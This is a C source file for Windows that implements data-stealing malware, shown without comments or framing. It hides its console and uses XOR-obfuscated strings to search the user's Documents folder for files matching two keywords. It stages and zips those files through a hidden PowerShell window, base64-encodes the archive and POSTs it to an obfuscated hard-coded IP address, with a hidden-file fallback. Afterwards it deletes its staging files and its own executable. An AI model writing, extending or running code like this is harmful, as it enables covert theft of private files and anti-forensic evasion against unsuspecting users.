#ifndef _WIN32
#error This program requires a Windows environment
#endif
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <ctype.h>
#include <string.h>

void func_82e9_449(char *dst, const char *src, int len, unsigned char key) {
    if (!dst || !src) return;
    for (int i = 0; i < len; i++) dst[i] = src[i] ^ key;
    dst[len] = 0;
}

int func_b61c_466(const char *str, const char *substr) {
    if (!str || !substr) return 0;
    return strstr(str, substr) != NULL;
}

void func_fa60_915(const char *path, HANDLE *var_280d_001, WIN32_FIND_DATAA var_280d_007, const char *var_ad7e_008, char *var_ad7e_003, int depth) {
    if (depth > 5) return;
    char search_path[256];
    snprintf(search_path, sizeof(search_path), "%s\\*", path);
    *var_280d_001 = FindFirstFileA(search_path, &var_280d_007);
    if (*var_280d_001 == INVALID_HANDLE_VALUE) return;
    const char keyword1_enc[] = {0x73, 0x5f, 0x5e, 0x56, 0x59, 0x54, 0x55, 0x5e, 0x44, 0x59, 0x51, 0x5c};
    char keyword1[13];
    func_82e9_449(keyword1, keyword1_enc, 12, 48);
    const char keyword2_enc[] = {0x3a, 0x0d, 0x0b, 0x11, 0x16, 0x1d, 0x0b, 0x0b, 0x58, 0x37, 0x08, 0x1d, 0x0a, 0x19, 0x0c, 0x11, 0x17, 0x16, 0x0b};
    char keyword2[20];
    func_82e9_449(keyword2, keyword2_enc, 19, 120);
    for (int var_7f4a_001 = 0; FindNextFileA(*var_280d_001, &var_280d_007); var_7f4a_001++) {
        if (var_280d_007.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (strcmp(var_280d_007.cFileName, ".") == 0 || strcmp(var_280d_007.cFileName, "..") == 0) continue;
            snprintf(var_ad7e_003, 256, "%s\\%s", path, var_280d_007.cFileName);
            HANDLE file_handle_2;
            func_fa60_915(var_ad7e_003, &file_handle_2, var_280d_007, var_ad7e_008, var_ad7e_003, depth + 1);
        } else if (func_b61c_466(var_280d_007.cFileName, keyword1) || func_b61c_466(var_280d_007.cFileName, keyword2)) {
            char src_path[256], dst_path[256];
            snprintf(src_path, sizeof(src_path), "%s\\%s", path, var_280d_007.cFileName);
            snprintf(dst_path, sizeof(dst_path), "%s\\%s", var_ad7e_008, var_280d_007.cFileName);
            CopyFileA(src_path, dst_path, FALSE);
        }
    }
    FindClose(*var_280d_001);
}

int main(int argc, char *argv[]) {
    FreeConsole();
    volatile int var_9c6d_004 = 83;
    const char var_ad7e_008_enc[] = {0xd5, 0xac, 0xca, 0xc3, 0xe5, 0xf3, 0xe4, 0xe5, 0xca, 0xc6, 0xe3, 0xf4, 0xfa, 0xff, 0xf5, 0xca, 0xd2, 0xf9, 0xe1, 0xf8, 0xfa, 0xf9, 0xf7, 0xf2, 0xe5, 0xca, 0xd2, 0xf9, 0xe1, 0xf8, 0xfa, 0xf9, 0xf7, 0xf2, 0xe5};
    char var_ad7e_008[36];
    func_82e9_449(var_ad7e_008, var_ad7e_008_enc, 35, 150);
    if (!CreateDirectoryA(var_ad7e_008, NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
        char temp_dir[36];
        GetTempPathA(sizeof(temp_dir), temp_dir);
        snprintf(var_ad7e_008, sizeof(var_ad7e_008), "%sPolyDownloads", temp_dir);
        CreateDirectoryA(var_ad7e_008, NULL);
    }
    FILE *log = fopen("C:\\Users\\Public\\debug.txt", "a");
    if (log) { fprintf(log, "Directory created: %s\n", var_ad7e_008); fclose(log); }
    HANDLE var_280d_001;
    WIN32_FIND_DATAA var_280d_007;
    char var_ad7e_003[256];
    char username[256];
    DWORD username_len = sizeof(username);
    GetEnvironmentVariableA("USERNAME", username, username_len);
    char root_path[256];
    snprintf(root_path, sizeof(root_path), "C:\\Users\\%s\\Documents", username);
    var_9c6d_004 += 1;
    func_fa60_915(root_path, &var_280d_001, var_280d_007, var_ad7e_008, var_ad7e_003, 0);
    log = fopen("C:\\Users\\Public\\debug.txt", "a");
    if (log) { fprintf(log, "Directory scan completed\n"); fclose(log); }
    char zip_cmd[512];
    snprintf(zip_cmd, sizeof(zip_cmd), "-Command \"Compress-Archive -Path '%s\\*' -DestinationPath 'C:\\Users\\Public\\Downloads\\archive.zip'\"", var_ad7e_008);
    if (ShellExecuteA(NULL, "open", "powershell.exe", zip_cmd, NULL, SW_HIDE) <= (HINSTANCE)32) {
        WIN32_FIND_DATAA find_data;
        char search_path[256];
        snprintf(search_path, sizeof(search_path), "%s\\*", var_ad7e_008);
        HANDLE hFind = FindFirstFileA(search_path, &find_data);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
                char src_path[256];
                snprintf(src_path, sizeof(src_path), "%s\\%s", var_ad7e_008, find_data.cFileName);
                char dst_path[256];
                snprintf(dst_path, sizeof(dst_path), "C:\\Users\\Public\\Downloads\\archive_%s", find_data.cFileName);
                CopyFileA(src_path, dst_path, FALSE);
            } while (FindNextFileA(hFind, &find_data));
            FindClose(hFind);
        }
    }
    log = fopen("C:\\Users\\Public\\debug.txt", "a");
    if (log) { fprintf(log, "Zipping completed\n"); fclose(log); }
    WSADATA wsa;
    SOCKET s = INVALID_SOCKET;
    struct sockaddr_in server;
    char *b64 = NULL;
    HANDLE hFile = CreateFileA("C:\\Users\\Public\\Downloads\\archive.zip", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) goto alt_exfil;
    DWORD file_size = GetFileSize(hFile, NULL);
    if (file_size == INVALID_FILE_SIZE) { CloseHandle(hFile); goto alt_exfil; }
    char *buf = malloc(file_size);
    if (!buf) { CloseHandle(hFile); goto alt_exfil; }
    DWORD read;
    if (!ReadFile(hFile, buf, file_size, &read, NULL) || read != file_size) { free(buf); CloseHandle(hFile); goto alt_exfil; }
    CloseHandle(hFile);
    const char b64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int b64_len = ((file_size + 2) / 3) * 4 + 1;
    b64 = malloc(b64_len);
    if (!b64) { free(buf); goto alt_exfil; }
    int j = 0;
    for (int i = 0; i < file_size; i += 3) {
        int a = buf[i];
        int b = i + 1 < file_size ? buf[i + 1] : 0;
        int c = i + 2 < file_size ? buf[i + 2] : 0;
        b64[j++] = b64_chars[(a >> 2) & 0x3F];
        b64[j++] = b64_chars[((a << 4) & 0x30) | ((b >> 4) & 0x0F)];
        b64[j++] = i + 1 < file_size ? b64_chars[((b << 2) & 0x3C) | ((c >> 6) & 0x03)] : '=';
        b64[j++] = i + 2 < file_size ? b64_chars[c & 0x3F] : '=';
    }
    b64[j] = 0;
    free(buf);
    log = fopen("C:\\Users\\Public\\debug.txt", "a");
    if (log) { fprintf(log, "Base64 encoding completed\n"); fclose(log); }
    if (WSAStartup(MAKEWORD(2,2), &wsa) == 0) {
        int http_success = 0;
        for (int port = 80; port <= 8080; port += port == 80 ? 7988 : 0) {
            for (int retry = 0; retry < 3; retry++) {
                s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                if (s == INVALID_SOCKET) continue;
                int timeout = 5000;
                setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
                setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));
                server.sin_family = AF_INET;
                const char server_ip_enc[] = {0xdd, 0xd5, 0xde, 0xc2, 0xdd, 0xda, 0xd4, 0xc2, 0xdd, 0xc2, 0xdb};
                char server_ip[16];
                func_82e9_449(server_ip, server_ip_enc, 11, 236);
                server.sin_addr.s_addr = inet_addr(server_ip);
                server.sin_port = htons(port);
                if (connect(s, (struct sockaddr*)&server, sizeof(server)) == 0) {
                    char req[8192];
                    snprintf(req, sizeof(req), "POST /upload HTTP/1.1\r\nHost: %s:%d\r\nContent-Type: application/octet-stream\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s", server_ip, port, b64_len - 1, b64);
                    if (send(s, req, strlen(req), 0) != SOCKET_ERROR) {
                        char resp[1024] = {0};
                        int received = recv(s, resp, sizeof(resp) - 1, 0);
                        if (received > 0 && strstr(resp, "200 OK")) {
                            http_success = 1;
                            closesocket(s);
                            break;
                        }
                    }
                }
                closesocket(s);
                s = INVALID_SOCKET;
                Sleep(1000);
            }
            if (http_success) break;
        }
        WSACleanup();
        if (!http_success) goto alt_exfil;
    } else {
        goto alt_exfil;
    }
    free(b64);
    goto cleanup;
    log = fopen("C:\\Users\\Public\\debug.txt", "a");
    if (log) { fprintf(log, "HTTP exfiltration completed\n"); fclose(log); }
alt_exfil:
    HANDLE hOut = CreateFileA("C:\\Users\\Public\\Documents\\.data.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hOut != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hOut, b64, b64_len - 1, &written, NULL);
        CloseHandle(hOut);
    }
    free(b64);
    log = fopen("C:\\Users\\Public\\debug.txt", "a");
    if (log) { fprintf(log, "Fallback exfiltration completed\n"); fclose(log); }
cleanup:
    ShellExecuteA(NULL, "open", "powershell.exe", "-Command \"Remove-Item -Path 'C:\\Users\\Public\\Downloads\\archive.zip' -ErrorAction SilentlyContinue\"", NULL, SW_HIDE);
    ShellExecuteA(NULL, "open", "powershell.exe", "-Command \"Remove-Item -Path '%s\\*' -Recurse -ErrorAction SilentlyContinue\"", var_ad7e_008, SW_HIDE);
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "cmd.exe /C ping 127.0.0.1 -n 2 > nul & del /F /Q \"%s\"", argv[0]);
    system(cmd);
    return 0;
}